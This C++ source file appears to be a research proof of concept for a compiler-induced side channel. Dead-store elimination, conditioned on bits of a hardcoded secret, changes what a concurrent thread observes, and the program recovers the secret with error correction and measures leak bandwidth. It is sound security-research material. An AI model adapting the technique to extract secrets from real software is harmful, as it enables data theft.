#include <stdio.h>
#include <stdint.h>
#include <stdbool.h>
#include <pthread.h>
#include <unistd.h>  // nanosleep()
#include <stdlib.h>  // exit()
#include <math.h>
#include <string.h>
#include <vector>
#include <atomic>

static const uint64_t SECRET = 0xf07b23a5461d8c9e;

static volatile bool alwaysFalse = false;
static unsigned x, y;

// if the SECRET-based condition evaluates to false (i.e. the appropriate bit
//   of SECRET was 0), gcc feels the need to keep the x=bit*2+1 store intact,
//   and the main thread will probably observe x==bit*2+1.
// if the SECRET-based condition evaluates to true (i.e. the appropriate bit
//   of SECRET was 1), gcc is fine skipping the dead x=bit*2+1 store and doing
//   just the x=bit*2+2 store, and the main thread cannot observe x==bit*2+1.
// iters: a tuning parameter, how long we attempt to stall (in some arbitrary
//   time unit) between the two stores to x
template<unsigned bitnum>
static void* threadfunc(void* iters) {
  x = bitnum*2 + 1;
  if(alwaysFalse) {
    if(SECRET & (1ULL<<bitnum)) y = 1;
  } else {
    y = 1;
  }

  // waste some time, but don't use a syscall like usleep().
  // If we use a syscall, gcc wants to do the x=1 store first, regardless
  // Must be a do-while loop so gcc knows it executes at least once
  // (otherwise gcc inserts an extra conditional branch, and suddenly thinks
  // the x=1 store is necessary again)
  uint64_t iterscount = (uint64_t)iters;
  volatile int v = 0;
  do { v++; } while(--iterscount > 0);

  x = bitnum*2 + 2;
  return (void*) (uintptr_t) y;  // keep gcc from removing the y=1 store entirely
}

// array storing pointers to all 64 threadfuncs
void* (*threadfunc_array[64])(void*);

// bitnum: which bit of the secret to leak
// iters: a tuning parameter passed on to threadfunc()
// returns the guessed value of the bit
static bool leakSingleBit(unsigned bitnum, uint64_t iters) {
  y = 0;
  volatile unsigned* x_vol = &x;  // use a volatile pointer so it keeps reloading for real
                                  // but we don't want x itself to be volatile, because then DSE isn't allowed
  pthread_t thread;
  void* (*threadfuncToUse)(void*) = threadfunc_array[bitnum];
  pthread_create(&thread, NULL, threadfuncToUse, (void*) iters);
  unsigned a;
  do { a = *x_vol; } while(a < bitnum*2+1);  // wait until we observe one of the
                                             // values written by this threadfunc
  unsigned b = y;
  void* dummy;
  pthread_join(thread, &dummy);
  return a==bitnum*2+2;  // if we observe x==bit*2+2, then the x=bit*2+1 store
                         // was (probably) eliminated; see notes on threadfunc()
}

// iters: a tuning parameter passed on to leakSingleBit()
// error_runs: how many redundant runs to do for error correction
//   a value of '1' means do no error correction
//   higher values indicate more error correction but will take longer
// returns the guessed value of the 64-bit secret
static uint64_t leak64bitSecret(uint64_t iters, unsigned error_runs) {
  unsigned run = 0;
  std::vector<uint64_t> leakedSecrets;
  leakedSecrets.reserve(error_runs);

  do {
    x = 0;
    uint64_t leakedSecret = 0;
    for(unsigned bitnum = 0; bitnum < 64; bitnum++) {
      if(leakSingleBit(bitnum, iters)) leakedSecret |= 1ULL << bitnum;
    }
    leakedSecrets.push_back(leakedSecret);
  } while(++run < error_runs);

  // if we ever observe 0 in any position, that means we observed x=bit*2+1,
  // which means the bit is *most definitely* actually 0
  uint64_t finalLeakedSecret = 0xffffffffffffffff;
  for(uint64_t secret : leakedSecrets) finalLeakedSecret &= secret;
  return finalLeakedSecret;
}

// returns a timestamp in nanoseconds
static uint64_t getTime() {
  struct timespec time;
  clock_gettime(CLOCK_MONOTONIC_RAW, &time);
  return (uint64_t)time.tv_sec*1000000000 + (uint64_t)time.tv_nsec;
}

struct manyRuns_res {
  unsigned numOffBy[65];  // Each index stores how many times leak64bitSecret()
                          //   was incorrect in exactly that many bits
                          // E.g. numOffBy[0] gives how many times
                          //   was exactly correct
  unsigned numRuns;  // how many total runs were done (sum of the entries in numOffBy)
  uint64_t elapsedNanoseconds;  // total duration of manyRuns, in nanoseconds
};

// iters: a tuning parameter passed on to leak64bitSecret()
// error_runs: a tuning parameter passed on to leak64bitSecret()
// durationMS: how long to run the program for (approximately), in milliseconds
// res: pointer to a manyRuns_res struct where results should be returned
void manyRuns(uint64_t iters, unsigned error_runs, uint64_t durationMS, struct manyRuns_res* res) {
  for(int i = 0; i < 65; i++) res->numOffBy[i] = 0;
  res->numRuns = 0;
  std::vector<uint64_t> guessedSecrets;
  uint64_t start = getTime();
  uint64_t targetEnd = start + durationMS*1000000;
  while(getTime() < targetEnd) {
    uint64_t guessedSecret = leak64bitSecret(iters, error_runs);
    unsigned bitsWrong = 0;
    for(int i = 0; i < 64; i++) if((SECRET & (1ULL << i)) ^ (guessedSecret & (1ULL << i))) bitsWrong++;
    res->numOffBy[bitsWrong]++;
    res->numRuns++;
    guessedSecrets.push_back(guessedSecret);
  }
  uint64_t end = getTime();
  res->elapsedNanoseconds = end-start;
}

// These are explained in manyRuns_analyze()
struct manyRuns_analysis {
  double ns_per_run;  // how many nanoseconds each run took on average
  double completelyCorrectRate;  // what percentage of trials obtained the completely correct secret
  double leakedBitsPerSec;  // information leak bandwidth, in bits/sec
};

// res: results to analyze
// analysis: pointer to a manyRuns_analysis struct where results should be returned
static void manyRuns_analyze(struct manyRuns_res* res, struct manyRuns_analysis* analysis) {
  analysis->ns_per_run = res->elapsedNanoseconds / (double)res->numRuns;
  double sec_per_run = analysis->ns_per_run / 1e9;
  analysis->completelyCorrectRate = res->numOffBy[0] / (double)res->numRuns;
  analysis->leakedBitsPerSec = 64 * (1 / sec_per_run);
}

static void printUsage(char* progname) {
  fprintf(stderr, "\n"
                  "Usage: %s tune\n"
                  "    or %s run iters error_runs\n\n"
                  "In the first case, print results for a variety of values for the \"iters\" and \"error_runs\" tuning parameters\n"
                  "In the second case, print results for just the given values of the tuning parameters\n\n"
                  "  \"iters\" tuning parameter: how long the signalling thread waits between its two assignments to x\n"
                  "  \"error_runs\" tuning parameter: how many redundant runs to do for error correction\n"
                  "    (a value of 1 means do no error correction)\n\n"
                  , progname, progname);
}

int main(int argc, char* argv[]) {
  bool tuning;
  uint64_t iters;
  unsigned error_runs;
  if(argc == 2) {
    if(strncmp(argv[1], "tune", 5)) {
      fprintf(stderr, "\nWith only one argument, expected \"tune\" but got %s\n", argv[1]);
      printUsage(argv[0]);
      exit(1);
    }
    tuning = true;
  } else if(argc == 4) {
    if(strncmp(argv[1], "run", 4)) {
      fprintf(stderr, "\nWith three arguments, expected the first to be \"run\" but got %s\n", argv[1]);
      printUsage(argv[0]);
      exit(1);
    }
    if(!sscanf(argv[2], "%llu", &iters)) {
      fprintf(stderr, "\nError reading \"iters\" argument\n");
      printUsage(argv[0]);
      exit(1);
    }
    if(!sscanf(argv[3], "%u", &error_runs)) {
      fprintf(stderr, "\nError reading \"error_runs\" argument\n");
      printUsage(argv[0]);
      exit(1);
    }
    tuning = false;
  } else {
    fprintf(stderr, "\nExpected 1 or 3 arguments, got %i\n", argc-1);
    printUsage(argv[0]);
    exit(1);
  }

  // initialize threadfunc array
#define INITIALIZE_THREADFUNC(i) threadfunc_array[i] = threadfunc<i>
  INITIALIZE_THREADFUNC(0);
  INITIALIZE_THREADFUNC(1);
  INITIALIZE_THREADFUNC(2);
  INITIALIZE_THREADFUNC(3);
  INITIALIZE_THREADFUNC(4);
  INITIALIZE_THREADFUNC(5);
  INITIALIZE_THREADFUNC(6);
  INITIALIZE_THREADFUNC(7);
  INITIALIZE_THREADFUNC(8);
  INITIALIZE_THREADFUNC(9);
  INITIALIZE_THREADFUNC(10);
  INITIALIZE_THREADFUNC(11);
  INITIALIZE_THREADFUNC(12);
  INITIALIZE_THREADFUNC(13);
  INITIALIZE_THREADFUNC(14);
  INITIALIZE_THREADFUNC(15);
  INITIALIZE_THREADFUNC(16);
  INITIALIZE_THREADFUNC(17);
  INITIALIZE_THREADFUNC(18);
  INITIALIZE_THREADFUNC(19);
  INITIALIZE_THREADFUNC(20);
  INITIALIZE_THREADFUNC(21);
  INITIALIZE_THREADFUNC(22);
  INITIALIZE_THREADFUNC(23);
  INITIALIZE_THREADFUNC(24);
  INITIALIZE_THREADFUNC(25);
  INITIALIZE_THREADFUNC(26);
  INITIALIZE_THREADFUNC(27);
  INITIALIZE_THREADFUNC(28);
  INITIALIZE_THREADFUNC(29);
  INITIALIZE_THREADFUNC(30);
  INITIALIZE_THREADFUNC(31);
  INITIALIZE_THREADFUNC(32);
  INITIALIZE_THREADFUNC(33);
  INITIALIZE_THREADFUNC(34);
  INITIALIZE_THREADFUNC(35);
  INITIALIZE_THREADFUNC(36);
  INITIALIZE_THREADFUNC(37);
  INITIALIZE_THREADFUNC(38);
  INITIALIZE_THREADFUNC(39);
  INITIALIZE_THREADFUNC(40);
  INITIALIZE_THREADFUNC(41);
  INITIALIZE_THREADFUNC(42);
  INITIALIZE_THREADFUNC(43);
  INITIALIZE_THREADFUNC(44);
  INITIALIZE_THREADFUNC(45);
  INITIALIZE_THREADFUNC(46);
  INITIALIZE_THREADFUNC(47);
  INITIALIZE_THREADFUNC(48);
  INITIALIZE_THREADFUNC(49);
  INITIALIZE_THREADFUNC(50);
  INITIALIZE_THREADFUNC(51);
  INITIALIZE_THREADFUNC(52);
  INITIALIZE_THREADFUNC(53);
  INITIALIZE_THREADFUNC(54);
  INITIALIZE_THREADFUNC(55);
  INITIALIZE_THREADFUNC(56);
  INITIALIZE_THREADFUNC(57);
  INITIALIZE_THREADFUNC(58);
  INITIALIZE_THREADFUNC(59);
  INITIALIZE_THREADFUNC(60);
  INITIALIZE_THREADFUNC(61);
  INITIALIZE_THREADFUNC(62);
  INITIALIZE_THREADFUNC(63);

  struct manyRuns_res res;

  if(tuning) {

    const uint64_t iters_vals[] = {1, 2, 5, 10, 20, 50, 100, 200, 500, 1000, 2000, 5000, 10000, 20000, 50000};
    const unsigned error_runs_vals[] = {1, 2, 3, 4, 5, 7, 10, 20, 50};
    printf("\n rows are iters, columns are # of redundant runs\n"
           " each cell is leaked bits per second : %% of runs completely correct\n\n");

    // column headings
    printf("       ");
    for(unsigned error_runs : error_runs_vals) printf("      %-3u       ", error_runs);
    printf("\n\n");

    struct manyRuns_analysis analysis;
    for(uint64_t iters : iters_vals) {
      printf("%6llu ", iters);  // row heading
      fflush(stdout);
      for(unsigned error_runs : error_runs_vals) {
        manyRuns(iters, error_runs, 10000, &res);
        manyRuns_analyze(&res, &analysis);
        printf("%8.1f : %-5.1f", analysis.leakedBitsPerSec, 100*analysis.completelyCorrectRate);
        fflush(stdout);
      }
      printf("\n");
    }

  } else {  // not tuning

    manyRuns(iters, error_runs, 2000, &res);
    struct manyRuns_analysis analysis;
    manyRuns_analyze(&res, &analysis);
    unsigned total = 0;
    for(unsigned i = 0; i < 65 && total != res.numRuns; i++) {
      printf("%u: %u\n", i, res.numOffBy[i]);
      total += res.numOffBy[i];
    }
    if(total != res.numRuns) printf("more: %u\n", res.numRuns - total);
    printf("%u runs in %.3f sec, or %.3f ms per run\n", res.numRuns, res.elapsedNanoseconds/(double)1e9, analysis.ns_per_run/1e6);
    printf("%.1f%% of runs were completely correct\n", analysis.completelyCorrectRate*100);
    printf("Information leak bandwidth approximately %.1f bits per second\n", analysis.leakedBitsPerSec);

  }
  return 0;
}
